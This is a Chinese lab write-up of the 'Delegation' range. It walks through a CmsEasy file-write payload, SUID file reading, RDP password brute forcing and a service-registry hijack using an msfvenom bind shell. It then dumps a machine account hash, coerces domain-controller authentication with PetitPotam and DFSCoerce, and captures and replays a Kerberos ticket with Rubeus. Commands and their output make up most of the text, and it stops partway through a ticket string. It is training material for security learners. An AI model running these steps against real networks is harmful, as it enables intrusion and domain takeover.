---
layout: post
title: Delegation - 春秋云镜
category: [春秋云镜]
tags: [active directory pentesting, unconstrained delegation, weak services permission]
---

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/d707d559a5abd136.png)

靶标介绍：

Delegation 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。

| 内网地址    | Host or FQDN            | 简要描述                       |
| ----------- | ----------------------- | ------------------------------ |
| 172.22.4.36 | loaclhost               | 外网 CmsEasy（易通 CMS）服务器 |
| 172.22.4.45 | WIN19.xiaorang.lab      | 配置了非约束委派的主机         |
| 172.22.4.19 | FILESERVER.xiaorang.lab | 文件服务器                     |
| 172.22.4.7  | DC01.xiaorang.lab       | 域控                           |

## Recon

```
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -p- --min-rate 10000 -oN nmap.txt xx.xx.xx.xx
Warning: xx.xx.xx.xx giving up on port because retransmission cap hit (10).
Nmap scan report for xx.xx.xx.xx
Host is up (0.17s latency).
Not shown: 58441 filtered tcp ports (no-response), 7090 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

┌──(root㉿kali)-[/home/kali/Desktop]
└─# grep 'open' nmap.txt | awk -F '/' '{print $1}' | paste -sd ','
21,22,80,3306

┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -p 21,22,80,3306 --reason -sCV -oN nmap.txt xx.xx.xx.xx
Nmap scan report for xx.xx.xx.xx
Host is up, received reset ttl 128 (0.020s latency).

PORT     STATE SERVICE REASON          VERSION
21/tcp   open  ftp     syn-ack ttl 128 vsftpd 3.0.3
22/tcp   open  ssh     syn-ack ttl 128 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 54b0821ac6e0160b73e284bbdbd3f902 (RSA)
|   256 4f25e7a456abe902d084bdfae1b54f14 (ECDSA)
|_  256 5d49ac0cc347ff4e2158121394bc28ae (ED25519)
80/tcp   open  http    syn-ack ttl 128 Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 12 disallowed entries
| /admin/ /cache/ /common/ /config/ /editor/ /htaccess/
|_/images/ /install/ /js/ /lib/ /template/ /upload/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-generator: CmsEasy 7_7_5_20210919_UTF8
|_http-title: \xE4\xB8\xAD\xE6\x96\x87\xE7\xBD\x91\xE9\xA1\xB5\xE6\xA0\x87\xE9\xA2\x98
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp open  mysql   syn-ack ttl 128 MySQL 8.0.29-0ubuntu0.20.04.3
|_ssl-date: TLS randomness does not represent time
| mysql-info:
|   Protocol: 10
|   Version: 8.0.29-0ubuntu0.20.04.3
|   Thread ID: 18
|   Capabilities flags: 65535
|   Some Capabilities: DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, LongPassword, Support41Auth, LongColumnFlag, InteractiveClient, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, SupportsTransactions, ConnectWithDatabase, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ODBCClient, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x032*%)\x17\x0Cg^\x02aQ\x032-\x10\x13&\x1AJ
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.29_Auto_Generated_Server_Certificate
| Not valid before: 2022-06-22T15:06:16
|_Not valid after:  2032-06-19T15:06:16
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

## Shell as www-data

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/e9ab6ec07d74f7d5.png)

### Method 1: Modify the template

方法一：后台弱口令 admin/123456 直接修改模板，插入 webshell。
![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/64c1385f4769d266.png)

### Method 2: CVE-2021-42643

方法二：[CVE-2021-42643](https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD) 后台任意文件写入，payload 如下。

```
POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1
Host: xx.xx.xx.xx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=su8uumht13u0a1u5535ctpncnu; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

sid=#data_d_.._d_.._d_.._d_phpinfo.php&slen=693&scontent=<?php phpinfo();?>

```

### Linux PrivEsc - SUID

查找拥有 SUID 权限的可执行程序：

```
/var/www/html/ >find / -perm -u=s -type f 2>/dev/null

/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/at
/usr/bin/diff
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

利用 [diff](https://gtfobins.github.io/gtfobins/diff/) 读取原本禁止访问的文件：

```
(www-data:/home/flag) $ cat flag01.txt
cat: flag01.txt: Permission denied
(www-data:/home/flag) $ diff --line-format=%L /dev/null flag01.txt
  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _
 |  _"\ \| ___"|/ |"|    \| ___"|/U /"___|uU  /"\  u  |_ " _|     ___     \/"_ \/ | \ |"|
/| | | | |  _|" U | | u   |  _|"  \| |  _ / \/ _ \/     | |      |_"_|    | | | |<|  \| |>
U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u
 |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|
  |||_   <<   >>  //  \\  <<   >>   _)(|_   \\    >>  _// \\_.-,_|___|_,-.  \\    ||   \\,-.
 (__)_) (__) (__)(_")("_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-' '-(_/  (__)   (_")  (_/
flag01: flag{60eec1a2-05cc-43c8-98fa-d3138c5adba2}
Great job!!!!!!
Here is the hint: WIN19\Adrian
I'll do whatever I can to rock you...
(www-data:/home/flag) $
```

## Shell as SYSTEM

### Windows Local Account Brute Force

根据提示爆破 `WIN19\Adrian` 用户的密码：

```
┌──(root㉿kali)-[/home/kali/Desktop]
└─# proxychains4 -q cme smb 172.22.4.45 -u "Adrian" -p ./rockyou.txt --local-auth
SMB         172.22.4.45     445    WIN19            [*] Windows 10.0 Build 17763 x64 (name:WIN19) (domain:WIN19) (signing:False) (SMBv1:False)
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian: STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:123456 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:123456789 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:password STATUS_LOGON_FAILURE
...
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:secret STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:pokemon STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:pepper STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:angelica STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED
```

爆破出密码 babygirl1，但已经过期了。

使用 rdsktop 远程登录修改密码：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q rdesktop 172.22.4.45 -u 'Adrian' -p 'babygirl1' -z
...
Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
```

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/10412432bf3d56e6.png)

### Windows PrivEsc - Weak Services Permission

登录上去后，桌面上就有一个 [PrivescCheck](https://github.com/itm4n/PrivescCheck) 的文件夹，里面包含了对该主机的扫描结果：`PrivesCheck_WIN19.html`。

在扫描报告中显示，有权限对该 SYSTEM 服务的注册表路径进行修改：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/433a450e0fa9c906.png)

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/dc22614418960032.png)

只需要将该服务程序更改为恶意服务程序，再启动该服务，即可获取主机 SYSTEM 权限。

```
PS C:\Users\Adrian\Desktop> reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Adrian\Desktop\EivlService.exe" /f
操作成功完成。
PS C:\Users\Adrian\Desktop> reg query "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /v ImagePath

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate
    ImagePath    REG_EXPAND_SZ    C:\Users\Adrian\Desktop\EivlService.exe

```

cs 生成恶意服务程序：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/4365dfac9eaaa965.png)

msf 生成恶意服务程序：

```
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -f exe-service -o EivlService.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 496 bytes
Final size of exe-service file: 48640 bytes
Saved as: EivlService.exe
```

启动 gupdate 服务：

```
PS C:\Users\Adrian\Desktop> cmd /c "sc start gupdate"

SERVICE_NAME: gupdate
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4676
        FLAGS              :

PS C:\Users\Adrian\Desktop>
```

此时成功上线了个 system 权限的 shell，查看 flag：

```
beacon> shell type C:\Users\Administrator\flag\flag02.txt
[*] Tasked beacon to run: type C:\Users\Administrator\flag\flag02.txt
[+] host called home, sent: 74 bytes
[+] received output:
 ________  _______   ___       _______   ________  ________  _________  ___  ________  ________
|\   ___ \|\  ___ \ |\  \     |\  ___ \ |\   ____\|\   __  \|\___   ___\\  \|\   __  \|\   ___  \
\ \  \_|\ \ \   __/|\ \  \    \ \   __/|\ \  \___|\ \  \|\  \|___ \  \_\ \  \ \  \|\  \ \  \\ \  \
 \ \  \ \\ \ \  \_|/_\ \  \    \ \  \_|/_\ \  \  __\ \   __  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \
  \ \  \_\\ \ \  \_|\ \ \  \____\ \  \_|\ \ \  \|\  \ \  \ \  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \
   \ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\   \ \__\ \ \__\ \_______\ \__\\ \__\
    \|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__|    \|__|  \|__|\|_______|\|__| \|__|


flag02: flag{ba229067-a210-4c23-b2af-68ef50465214}
```

导出机器账户 WIN19$ 的 hash：

```
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN19$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/4/7 12:09:28
SID               : S-1-5-20
 msv :
  [00000003] Primary
  * Username : WIN19$
  * Domain   : XIAORANG
  * NTLM     : f013947fa647df6403a4653648059060
  * SHA1     : 489e2777d1641ad8f1ca9798c7b693425fdffba1
 tspkg :
 wdigest :
  * Username : WIN19$
  * Domain   : XIAORANG
  * Password : (null)
 kerberos :
  * Username : win19$
  * Domain   : XIAORANG.LAB
  * Password : a2 60 70 fc 31 56 dc 5d 7e 84 a0 20 94 c7 98 0e 79 4c 11 fa af 71 64 4e 40 7f 77 e2 82 78 df 95 c5 32 89 38 0c 81 7b 9f 1d 59 9d e4 0c dd 50 ed 98 0c d9 12 fc 49 69 20 77 fa a5 ea 95 35 a3 f4 70 e7 ba 10 b1 e8 3a 5c 03 d1 7e ec 27 c2 24 c2 36 5e 6a 2a d3 db e1 b0 a6 d7 20 d4 1b 75 f9 00 90 c8 c2 a8 ec 31 52 3a 62 b0 95 aa 11 24 59 cb 07 96 14 30 16 1a 25 cd 97 9d 5b de d8 76 10 6b 20 6c df 20 76 5c fb 58 bd 47 10 e5 82 04 7b 48 87 4e 2c 85 b6 57 12 63 df 39 30 2c 32 b1 85 31 8c 89 54 94 c8 ee d4 83 b8 97 63 0f 3f 69 0f 87 96 24 e6 3b d7 d6 a2 6e c1 f8 02 91 c1 1b 4a a6 3e fb 2a 53 ac 92 8b e2 87 b6 f7 6b 6b 34 54 c2 1d 86 2d bc 07 6d 03 20 5c 85 a4 1e b6 2e d8 50 59 7b 23 c2 f5 81 9b 19 be e3 26 7f 7e 1e ae 86
 ssp :
 credman :
```

## Shell as domainadmin

### AD recon with Bloodhound

使用 bloodhound 分析域环境，发现除了域控以外，主机 WIN19$ 也配置了非约束性委派：

```
┌──(root㉿kali)-[/home/kali/Desktop/BloodHound.py]
└─# proxychains4 -q python3 bloodhound.py -u "WIN19$" --hashes f013947fa647df6403a4653648059060:f013947fa647df6403a4653648059060 -d xiaorang.lab -dc DC01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip

INFO: Found AD domain: xiaorang.lab
INFO: Connecting to LDAP server: dc01.xiaorang.lab
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: dc01.xiaorang.lab
INFO: Found 7 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer: WIN19.xiaorang.lab
INFO: Querying computer: FILESERVER.xiaorang.lab
INFO: Querying computer: DC01.xiaorang.lab
INFO: Done in 00M 15S
INFO: Compressing output into 20230224070634_bloodhound.zip
```

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/4c3ae9339a58bd38.png)

### Unconstrained Delegation & Coerced Authentication

使用 PowerView 查询到的配置了非约束委派机器如下：

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN19
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : zh_CN
Domain          : XIAORANG
Logged On Users : 9
Meterpreter     : x64/windows
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_import /home/kali/PowerView.ps1
[+] File successfully imported. No result was returned.
meterpreter > powershell_execute "Get-NetComputer -Unconstrained -Domain xiaorang.lab | select samaccountname"
[+] Command execution completed:

samaccountname
--------------
DC01$
WIN19$
```

使用 PetitPotam 进行强制认证：

```
PS C:\PetitPotam> proxychains4 -q python3 .\PetitPotam.py -u "WIN19$" -hashes :f013947fa647df6403a4653648059060 -dc-ip 172.22.4.7 WIN19 172.22.4.7


              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:172.22.4.7[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

也可以使用 dfscoerce 进行强制认证：

```
PS C:\DFSCoerce> proxychains4 -q python3 .\dfscoerce.py -u "WIN19$" -hashes :f013947fa647df6403a4653648059060 -d xiaorang.lab -dc-ip 172.22.4.7 "WIN19" 172.22.4.7
[-] Connecting to ncacn_np:172.22.4.7[\PIPE\netdfs]
[+] Successfully bound!
[-] Sending NetrDfsRemoveStdRoot!
NetrDfsRemoveStdRoot
ServerName:                      'WIN19\x00'
RootShare:                       'test\x00'
ApiFlags:                        1


DFSNM SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
```

> 问题：这里出现了个让我疑惑 😶‍🌫️😶‍🌫️😶‍🌫️ 的问题，在强制认证工具上指定监听主机这里，当我填写 ip (172.22.4.45) 地址时，Rubeus 上接收不到 TGT，换成 hostname (WIN19) 就可以了。我测试了 dfscoerce 和 PetitPotam 两个工具都是这样。

Rubeus 在接收到域控主机的 TGT 后，直接将 TGT 导入到内存中。此时直接进行 dcsyn 即可获取域管 hash：

```
beacon> execute-assembly /home/kali/Desktop/Rubeus2.2.1.exe monitor /interval:1 /filteruser:DC01$ /nowrap /ptt
[*] Tasked beacon to run .NET program: Rubeus2.2.1.exe monitor /interval:1 /filteruser:DC01$ /nowrap /ptt
[+] host called home, sent: 553615 bytes
[+] received output:

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: TGT Monitoring
[*] Target user     : DC01$
[*] Monitoring every 1 seconds for new TGTs


[+] received output:

[*] 2023/4/7 7:01:48 UTC - Found new TGT:

  User                  :  DC01$@XIAORANG.LAB
  StartTime             :  2023/4/7 12:10:06
  EndTime               :  2023/4/7 22:10:06
  RenewTill             :  2023/4/14 12:10:06
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5/O4c5eHwmKkcg/+Oy2uqUoNc43W3sV/5HhfF9V1Pel9gwDwW/BpAsfnTy/z0M4kVggrM03FeMokMNPmA8+n1fJr2R+sGoSGnfaaBQIskIg4ylTOpkTza7Il4bYrt7Gzw87Yzw5+XdHHlVbGi6gLtDdWUx0HtZCAzIt3XiH80mY34Ax/U890y0U6197b8vP1e0GdsFP4OVTx448Z2ntcVAVnPZlMO4NVpmPRAym4Uzsc5Ws+1hXJ0RJ6JWSNj86nTKR8vMY/55YgOrDgoZlHcYkVy6MUcUtY4B0ZjsrSSJ2VME8OFm2COxhbO0O1Y/+MqCCsJL7ibMmANK/K6GyLh5DnaO39qmbZHYSdjILvx75Sbc+V8pTTQ+ltcs/m64mllOMCFjAYqvlMCjCWU63xFifpgJAD+66aMIxH9X/l7vUIHUrlIcdfT/RtXnn2bUGM8tYwtKt9pZ8tnhs8RQ6mlQ/MPGAwb+8XxGBoGM7ZJLxZuAnkX8FaBKczHO5DEJRkC9TV7B3K+up9CDZCJk/jpyCpsmMh7KX1iOUya2nYZlcRKSiNAtWBBzeuEmgawptv2z8kAJnEW2o5QumZFg/DcnpywyPKTAZKMxBO5QZAirzUqmEmgBVZK3COASO8vKaP6tbHaCK/9uyTNzvJTffdiLYJ4BTZTrowe1Hexu54LEStmrThAa27pxhYiit4B0quScnJIKLextheBbRicY3VrS1sgHVPzJNs3Jj3swzyQ0Ei+QnZFkW0GddYgzQe9l9U6why8nd0rx/Ro6RXKOahF3V67P3ppl1zQx9bmmihTYD8rMuvQipqXnL9v7yhbxKHI/l8qYG1OKNHwMXGSpQsUi4TKveVfYj6plgx2OkidXuuZCzgZKJF1yHcC8ohqliq+ybLvlBQUPCozIafgKXNHtVsaw51mPnX3fIB4TkQwbga9180SAuIq1izFUwU8t/TXrZtwJdeb6FCoXeYHDkCwomjOs5mVkMRANu+Bb5Z6ex07v1FHNqSZJnXLSjdEKHBVeMidhWEryBG/PLgiBvd87UNZQvqWOqIZwZEy2pKY4KCqf+T6A7tz7DNOfLE3NiN9GMq9Q3TrGr0GMC3Rs+9pt4i+vzROinGYImHAnnaVEBct/yA0RNBC1n7taJmy34iR+NjKekRcQvwfywRRrIPbZqTn0BnAFyoTfKT8088O2GPGnExwE3v5TQ6nuOpy+GsuvEkwBkNPNz8Iqy3MCM1oA2XBLhYX6yJDRLAQFRrnF8no4zasAdgpDPmV1+GkQYrcYcoXZngq1BQ5dWLPaxBDcyfwEE0DbBLemOk4DAtpyMDKB4QunLdUpP4y9ntXneEocfsiDXyeCxOAodIGi1ldED8J+B/4sQ9+JPGxbwrLP1Mj999hFOhS1ZNBeZDxniBFMUDpF9C1eznA6Cz3NmoNy1L6ykvuxk8ao3Jv0+0ijgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAQbMz8pxIllmYoadNQ81r1H5G682kRN1ZMR1lx7grDrKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIzMDQwNzA0MTAwNlqmERgPMjAyMzA0MDcxNDEwMDZapxEYDzIwMjMwNDE0MDQxMDA2WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==

[*] Ticket cache size: 1

beacon> execute-assembly /home/kali/Desktop/Rubeus2.2.1.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5/O4c5eHwmKkcg/+Oy2uqUoNc43W3sV/5HhfF9V1Pel9gwDwW/BpAsfnTy/z0M4kVggrM03FeMokMNPmA8+n1fJr2R+sGoSGnfaaBQIskIg4ylTOpkTza7Il4bYrt7Gzw87Yzw5+XdHHlVbGi6gLtDdWUx0HtZCAzIt3XiH80mY34Ax/U890y0U6197b8vP1e0GdsFP4OVTx448Z2ntcVAVnPZlMO4NVpmPRAym4Uzsc5Ws+1hXJ0RJ6JWSNj86nTKR8vMY/55YgOrDgoZlHcYkVy6MUcUtY4B0ZjsrSSJ2VME8OFm2COxhbO0O1Y/+MqCCsJL7ibMmANK/K6GyLh5DnaO39qmbZHYSdjILvx75Sbc+V8pTTQ+ltcs/m64mllOMCFjAYqvlMCjCWU63xFifpgJAD+66aMIxH9X/l7vUIHUrlIcdfT/RtXnn2bUGM8tYwtKt9pZ8tnhs8RQ6mlQ/MPGAwb+8XxGBoGM7ZJLxZuAnkX8FaBKczHO5DEJRkC9TV7B3K+up9CDZCJk/jpyCpsmMh7KX1iOUya2nYZlcRKSiNAtWBBzeuEmgawptv2z8kAJnEW2o5QumZFg/DcnpywyPKTAZKMxBO5QZAirzUqmEmgBVZK3COASO8vKaP6tbHaCK/9uyTNzvJTffdiLYJ4BTZTrowe1Hexu54LEStmrThAa27pxhYiit4B0quScnJIKLextheBbRicY3VrS1sgHVPzJNs3Jj3swzyQ0Ei+QnZFkW0GddYgzQe9l9U6why8nd0rx/Ro6RXKOahF3V67P3ppl1zQx9bmmihTYD8rMuvQipqXnL9v7yhbxKHI/l8qYG1OKNHwMXGSpQsUi4TKveVfYj6plgx2OkidXuuZCzgZKJF1yHcC8ohqliq+ybLvlBQUPCozIafgKXNHtVsaw51mPnX3fIB4TkQwbga9180SAuIq1izFUwU8t/TXrZtwJdeb6FCoXeYHDkCwomjOs5mVkMRANu+Bb5Z6ex07v1FHNqSZJnXLSjdEKHBVeMidhWEryBG/PLgiBvd87UNZQvqWOqIZwZEy2pKY4KCqf+T6A7tz7DNOfLE3NiN9GMq9Q3TrGr0GMC3Rs+9pt4i+vzROinGYImHAnnaVEBct/yA0RNBC1n7taJmy34iR+NjKekRcQvwfywRRrIPbZqTn0BnAFyoTfKT8088O2GPGnExwE3v5TQ6nuOpy+GsuvEkwBkNPNz8Iqy3MCM1oA2XBLhYX6yJDRLAQFRrnF8no4zasAdgpDPmV1+GkQYrcYcoXZngq1BQ5dWLPaxBDcyfwEE0DbBLemOk4DAtpyMDKB4QunLdUpP4y9ntXneEocfsiDXyeCxOAodIGi1ldED8J+B/4sQ9+JPGxbwrLP1Mj999hFOhS1ZNBeZDxniBFMUDpF9C1eznA6Cz3NmoNy1L6ykvuxk8ao3Jv0+0ijgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAQbMz8pxIllmYoadNQ81r1H5G682kRN1ZMR1lx7grDrKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIzMDQwNzA0MTAwNlqmERgPMjAyMzA0MDcxNDEwMDZapxEYDzIwMjMwNDE0MDQxMDA2WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
[*] Tasked beacon to run .NET program: Rubeus2.2.1.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5/O4c5eHwmKkcg/+Oy2uqUoNc43W3sV/5HhfF9V1Pel9gwDwW/BpAsfnTy/z0M4kVggrM03FeMokMNPmA8+n1fJr2R+sGoSGnfaaBQIskIg4ylTOpkTza7Il4bYrt7Gzw87Yzw5+XdHHlVbGi6gLtDdWUx0HtZCAzIt3XiH80mY34Ax/U890y0U6197b8vP1e0GdsFP4OVTx448Z2ntcVAVnPZlMO4NVpmPRAym4Uzsc5Ws+1hXJ0RJ6JWSNj86nTKR8vMY/55YgOrDgoZlHcYkVy6MUcUtY4B0ZjsrSSJ2VME8OFm2COxhbO0O1Y/+MqCCsJL7ibMmANK/K6GyLh5DnaO39qmbZHYSdjILvx75Sbc+V8pTTQ+ltcs/m64mllOMCFjAYqvlMCjCWU63xFifpgJAD+66aMIxH9X/l7vUIHUrlIcdfT/RtXnn2bUGM8tYwtKt9pZ8tnhs8RQ6mlQ/MPGAwb+8XxGBoGM7ZJLxZuAnkX8FaBKczHO5DEJRkC9TV7B3K+up9CDZCJk/jpyCpsmMh7KX1iOUya2nYZlcRKSiNAtWBBzeuEmgawptv2z8kAJnEW2o5QumZFg/DcnpywyPKTAZKMxBO5QZAirzUqmEmgBVZK3COASO8vKaP6tbHaCK/9uyTNzvJTffdiLYJ4BTZTrowe1Hexu54LEStmrThAa27pxhYiit4B0quScnJIKLextheBbRicY3VrS1sgHVPzJNs3Jj3swzyQ0Ei+QnZFkW0GddYgzQe9l9U6why8nd0rx/Ro6RXKOahF3V67P3ppl1zQx9bmmihTYD8rMuvQipqXnL9v7yhbxKHI/l8qYG1OKNHwMXGSpQsUi4TKveVfYj6plgx2OkidXuuZCzgZKJF1yHcC8ohqliq+ybLvlBQUPCozIafgKXNHtVsaw51mPnX3fIB4TkQwbga9180SAuIq1izFUwU8t/TXrZtwJdeb6FCoXeYHDkCwomjOs5mVkMRANu+Bb5Z6ex07v1FHNqSZJnXLSjdEKHBVeMidhWEryBG/PLgiBvd87UNZQvqWOqIZwZEy2pKY4KCqf+T6A7tz7DNOfLE3NiN9GMq9Q3TrGr0GMC3Rs+9pt4i+vzROinGYImHAnnaVEBct/yA0RNBC1n7taJmy34iR+NjKekRcQvwfywRRrIPbZqTn0BnAFyoTfKT8088O2GPGnExwE3v5TQ6nuOpy+GsuvEkwBkNPNz8Iqy3MCM1oA2